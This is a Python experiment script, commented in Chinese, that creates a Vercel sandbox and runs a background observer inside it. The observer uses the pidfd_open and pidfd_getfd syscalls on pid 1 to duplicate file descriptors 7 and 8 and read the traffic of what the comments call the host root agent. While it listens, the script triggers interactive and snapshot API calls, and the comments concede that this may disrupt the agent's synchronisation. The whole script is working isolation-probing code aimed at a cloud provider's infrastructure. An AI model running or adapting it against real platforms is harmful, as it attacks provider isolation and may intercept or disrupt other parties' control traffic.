# -*- coding: utf-8 -*-
"""实验J285: 复制 fd 7/8 + 长观察 + 触发宿主 agent 活动
对端 = 宿主 root 进程 (pid=0, uid=0)。观察其上流量, 同时触发
interactive/snapshot 等 API 操作, 看 agent 是否发数据。
注意: 读走的数据会消费 agent->init 流量, 可能破坏同步(测试沙箱, 风险可控)
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj285"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# 后台观察器: 复制 fd 7/8, 非阻塞读, 结果写 /tmp/obs.txt
OBS = r'''
import os, time, ctypes

libc = ctypes.CDLL(None, use_errno=True)
SYS_pidfd_open, SYS_pidfd_getfd = 434, 438

def pidfd_open(pid, flags=0):
    r = libc.syscall(SYS_pidfd_open, pid, flags)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

def pidfd_getfd(pidfd, fd, flags=0):
    r = libc.syscall(SYS_pidfd_getfd, pidfd, fd, flags)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

pidfd = pidfd_open(1, 0)
fds = {}
for i in (7, 8):
    try:
        fds[i] = pidfd_getfd(pidfd, i, 0)
        os.set_blocking(fds[i], False)
    except Exception as e:
        fds[i] = None
rec = open("/tmp/obs.txt", "w")
rec.write("start %s\n" % time.time())
t0 = time.time()
while time.time() - t0 < 75:
    for i, fd in fds.items():
        if fd is None:
            continue
        try:
            d = os.read(fd, 8192)
            if d:
                rec.write("[%ds fd%d %dB] %r\n" % (time.time()-t0, i, len(d), d[:500]))
                rec.flush()
        except BlockingIOError:
            pass
        except Exception as e:
            rec.write("ERR fd%d %s: %s\n" % (i, type(e).__name__, e))
            rec.flush()
    time.sleep(0.15)
rec.write("done\n")
rec.close()
os.close(pidfd)
'''
CODE = r'''
import subprocess
open("/tmp/obs.py", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/obs.py"],
    stdout=open("/tmp/obs.log", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("bg pid", r.pid, flush=True)
''' % OBS
run_cmd(sid, CODE, "BG_OBS")
print("observer started, triggering APIs...", flush=True)

# 触发宿主 agent 活动 (观察期间)
triggers = [
    ("INTERACTIVE", "POST", f"/v2/sandboxes/sessions/{sid}/interactive?teamId={TEAM}", {}),
    ("SNAPSHOT_LIST", "GET", f"/v2/sandboxes?teamId={TEAM}&projectId={PROJ}", None),
    ("SNAPSHOT_CREATE", "POST", f"/v2/sandboxes/sessions/{sid}/snapshots?teamId={TEAM}", {}),
]
for label, m, p, b in triggers:
    c, r = api(m, p, b if b is not None else None)
    print(f"[{label}] status {c}: {r[:150]}", flush=True)
    time.sleep(8)

# 等观察器结束
time.sleep(55)
out = run_cmd(sid, r'''
import os
print(open("/tmp/obs.txt").read() if os.path.exists("/tmp/obs.txt") else "MISSING", flush=True)
print("===LOG===", flush=True)
print(open("/tmp/obs.log").read() if os.path.exists("/tmp/obs.log") else "", flush=True)
''', "GET_OBS")
print("\n=====OBSERVATION=====", flush=True)
print(out[:5000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
